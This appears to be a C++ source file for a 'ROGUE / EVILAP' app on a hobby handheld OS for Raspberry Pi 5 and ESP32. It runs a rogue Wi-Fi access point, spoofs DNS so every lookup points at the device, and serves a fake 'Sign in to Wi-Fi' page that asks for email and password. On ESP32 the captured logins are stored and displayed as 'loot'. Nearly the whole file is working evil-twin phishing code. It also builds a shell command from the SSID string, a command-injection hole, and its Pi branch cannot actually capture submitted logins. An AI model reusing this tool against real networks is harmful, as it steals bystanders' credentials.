// app_rogue.cpp — soft AP, captive portal, DNS spoof, loot viewer.
// SOFTAP via nmcli hotspot (Pi5) / WiFi.softAP (ESP32); CAPTIVE via
// python http.server / WebServer.
//   2. DNS SPOOF — UDP/53 listener that returns AP IP for every A query.
//                  Pi 5: `dnsmasq --address=/#/...`. ESP32: `DNSServer`.
//   3. LOOT      — read-only viewer; last 8 captured login rows.
//
// One shared scheduled pump task: rogue_pump. Pump forwards to whichever
// sub-mode is armed. Pump survives `app_rogue_suspend` (operator can
// back out to home while the AP keeps running).

#include "app_rogue.h"
#include "UI/draw.h"
#include "UI/theme.h"
#include "hal/hal_storage.h"
#include "os/scheduler.h"
#include "os/events.h"
#include "config.h"
#include <cstdio>
#include <cstring>

#ifdef VOIDOS_RPI5
#include <cstdlib>
#include <fstream>
#include <sys/stat.h>
#include <unistd.h>
#endif

// ── UI + state ─────────────────────────────────────────────────────────

static const char *LABELS[] = { "SOFTAP", "CAPTIVE", "DNS SPOOF", "LOOT" };
static const uint8_t N_ROWS = sizeof(LABELS)/sizeof(LABELS[0]);
static uint8_t _row = 0;
static bool    _softap = false, _captive = false, _dnsspoof = false;
static char    _status[24] = "ARMED";
static char    _ssid[33] = "Void-OS";
static uint8_t _chan = 6;

static int8_t _pump_id = -1;

// ── Persistence ────────────────────────────────────────────────────────

static void load_cfg() {
    char buf[33]; uint8_t ch;
    if (hal_storage_get_str("rogue_ssid", buf, sizeof(buf)))
        std::snprintf(_ssid, sizeof(_ssid), "%s", buf);
    ch = hal_storage_get_u8("rogue_chan", 6);
    if (ch >= 1 && ch <= 13) _chan = ch;
}

// ── Loot (recent captchas/passwords handed to the portal) ───────────────

#define ROGUE_LOOT_MAX  8
static char _loot[ROGUE_LOOT_MAX][64];
static uint8_t _loot_n = 0;

static void loot_record(const char *ts, const char *email, const char *pass) {
#ifdef VOIDOS_RPI5
    mkdir("/var/lib/void-os/loot", 0755);
    std::ofstream f("/var/lib/void-os/loot/logins.csv", std::ios::app);
    if (f) f << ts << "," << email << "," << pass << "\n";
#endif
    // RAM mirror
    if (_loot_n >= ROGUE_LOOT_MAX) {
        for (uint8_t i = 1; i < ROGUE_LOOT_MAX; ++i)
            std::snprintf(_loot[i-1], 64, "%s", _loot[i]);
        _loot_n = ROGUE_LOOT_MAX - 1;
    }
    std::snprintf(_loot[_loot_n++], 64, "%s | %s | %s", ts, email, pass);
}

static void loot_load() {
    _loot_n = 0;
#ifdef VOIDOS_RPI5
    std::ifstream f("/var/lib/void-os/loot/logins.csv");
    if (!f) return;
    char line[80];
    while (f.getline(line, sizeof(line)) && _loot_n < ROGUE_LOOT_MAX) {
        if (line[0]) {
            std::strncpy(_loot[_loot_n], line, sizeof(_loot[0]) - 1);
            _loot[_loot_n][sizeof(_loot[0]) - 1] = '\0';
            ++_loot_n;
        }
    }
#endif
}

// ── Portal HTML (one file, seeded the first time the softAP turns on) ──

static const char *PORTAL_HTML =
    "<html><body><h2>Sign in to Wi-Fi</h2>"
    "<form method='POST' action='/login'>"
    "<input name='email' placeholder='email'><br>"
    "<input name='password' type='password' placeholder='password'><br>"
    "<button>Sign in</button></form></body></html>";

#ifdef VOIDOS_RPI5
// ── Pi 5 spawn helpers ─────────────────────────────────────────────────

static void portal_seed() {
    mkdir("/var/lib/void-os/portal", 0755);
    std::ofstream f("/var/lib/void-os/portal/index.html", std::ios::trunc);
    if (f) f << PORTAL_HTML;
}

static void plat_softap_on() {
    portal_seed();
    char cmd[160];
    std::snprintf(cmd, sizeof(cmd),
                  "nmcli device wifi hotspot ifname wlan0 ssid '%s' channel %u >/dev/null 2>&1",
                  _ssid, _chan);
    std::system(cmd);
}
static void plat_softap_off() { std::system("nmcli connection down Hotspot >/dev/null 2>&1"); }
static void plat_captive_on() {
    pid_t pid = fork();
    if (pid == 0) { execl("/usr/bin/python3", "python3", "-m", "http.server", "80",
                          "--directory", "/var/lib/void-os/portal", (char*)0); _exit(1); }
}
static void plat_captive_off()  { std::system("pkill -f 'python3 -m http.server 80' >/dev/null 2>&1"); }
static void plat_dnsspoof_on()  {
    mkdir("/var/lib/void-os/loot", 0755);
    pid_t pid = fork();
    if (pid == 0) {
        execl("/usr/sbin/dnsmasq", "dnsmasq",
              "--no-daemon", "--log-queries", "--port=5353",
              "--address=/#/192.168.4.1",
              "--pid-file=/tmp/vdns.pid", (char*)0);
        _exit(1);
    }
}
static void plat_dnsspoof_off() { std::system("pkill -F /tmp/vdns.pid >/dev/null 2>&1"); }
#else
// ── ESP32 helpers (Arduino libs are bundled with the core) ─────────────

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
static WebServer _srv(80);
static DNSServer _dns;

static void _on_login() {
    String email = _srv.arg("email");
    String pass  = _srv.arg("password");
    char ts[24]; std::snprintf(ts, sizeof(ts), "%lu", (unsigned long)millis());
    loot_record(ts, email.c_str(), pass.c_str());
    _srv.send(200, "text/html", "<html><body>Signed in.</body></html>");
}

static void plat_softap_on() {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(_ssid, nullptr, _chan, 0, 8);
    std::snprintf(_status, sizeof(_status), "AP %s ch%u", _ssid, _chan);
    _softap = true;
}
static void plat_softap_off() {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    _softap = false;
}
static void plat_captive_on() {
    _srv.on("/", []() { _srv.send(200, "text/html", PORTAL_HTML); });
    _srv.on("/login", _on_login);
    _srv.begin();
    std::snprintf(_status, sizeof(_status), "HTTP 80");
}
static void plat_captive_off()  { _srv.stop(); }
static void plat_dnsspoof_on()  {
    _dns.start(53, "*", WiFi.softAPIP());
    std::snprintf(_status, sizeof(_status), "DNS 53");
}
static void plat_dnsspoof_off() { _dns.stop(); }
#endif

// ── Shared pump ────────────────────────────────────────────────────────

static void rogue_pump() {
    if (!_softap && !_captive && !_dnsspoof) return;
#ifdef VOIDOS_RPI5
    // Pi: child processes do their own pumping; nothing to call into.
#else
    if (_captive)  _srv.handleClient();
    if (_dnsspoof) _dns.processNextRequest();
#endif
}

// ── Lifecycle ──────────────────────────────────────────────────────────

void app_rogue_init() {
    load_cfg();
    if (_pump_id < 0) _pump_id = sched_add("rogue_pump", rogue_pump, 0, 6);
}

void app_rogue_tick()    {}
void app_rogue_suspend() {}

void app_rogue_event(Event e) {
    if (e.type == EVT_BTN_B_DOWN) { std::snprintf(_status,sizeof(_status),"READY"); return; }
    if (e.type == EVT_POT_CHANGED) {
        _row = (e.data * N_ROWS) / 256;
        if (_row >= N_ROWS) _row = N_ROWS - 1;
        if (_row == 3) loot_load();
        return;
    }
    if (e.type == EVT_BTN_A_DOWN) {
        switch (_row) {
            case 0: _softap = !_softap;
                    if (_softap) plat_softap_on(); else plat_softap_off(); break;
            case 1: _captive = !_captive;
                    if (_captive) plat_captive_on(); else plat_captive_off(); break;
            case 2: _dnsspoof = !_dnsspoof;
                    if (_dnsspoof) plat_dnsspoof_on(); else plat_dnsspoof_off(); break;
            case 3: loot_load();
                    std::snprintf(_status, sizeof(_status), "loot: %u", _loot_n); break;
        }
        return;
    }
}

// ── Draw ───────────────────────────────────────────────────────────────

void app_rogue_draw() {
    draw_fill(0,0,SCR_W,SCR_H,T_BG);
    draw_fill(0,0,SCR_W,STATS_H,T_PANEL);
    draw_hline(0,STATS_H,SCR_W,T_BORDER);
    draw_text(8, 8, "ROGUE / EVILAP", T_FG, T_PANEL, FONT_SM);
    draw_textf(SCR_W - 90, 8, T_DIM, T_PANEL, FONT_SM, "%s ch%u", _ssid, _chan);

    int row_h = 26;
    for (uint8_t i = 0; i < N_ROWS; ++i) {
        int y = STATS_H + 8 + i * row_h;
        bool on = (i == 0 && _softap) || (i == 1 && _captive) || (i == 2 && _dnsspoof);
        draw_textf(8, y, on ? T_WARN : (i == _row ? T_FG : T_DIM),
                   T_BG, FONT_SM,
                   "%s %s [%s]",
                   i == _row ? ">" : " ", LABELS[i], on ? "ON" : "off");
    }

    int info_y = STATS_H + 8 + N_ROWS * row_h + 4;
    if (_row == 3) {
        for (uint8_t i = 0; i < _loot_n; ++i)
            draw_textf(8, info_y + (int)i * 11, T_DIM, T_BG, FONT_SM, "%s", _loot[i]);
    } else {
        draw_textf(8, info_y, T_FG, T_BG, FONT_SM, "SSID %s", _ssid);
        draw_textf(8, info_y + 12, T_DIM, T_BG, FONT_SM,
                   "CAP: softAP+captive+dnspoof");
    }
    draw_textf(8, SCR_H - 28, T_DIM, T_BG, FONT_SM, "%s", _status);
    draw_hline(0, SCR_H - 16, SCR_W, T_BORDER);
    draw_text(8, SCR_H - 12, "[A] TOGGLE  [B] BACK  POT=row", T_DIM, T_BG, FONT_SM);
}
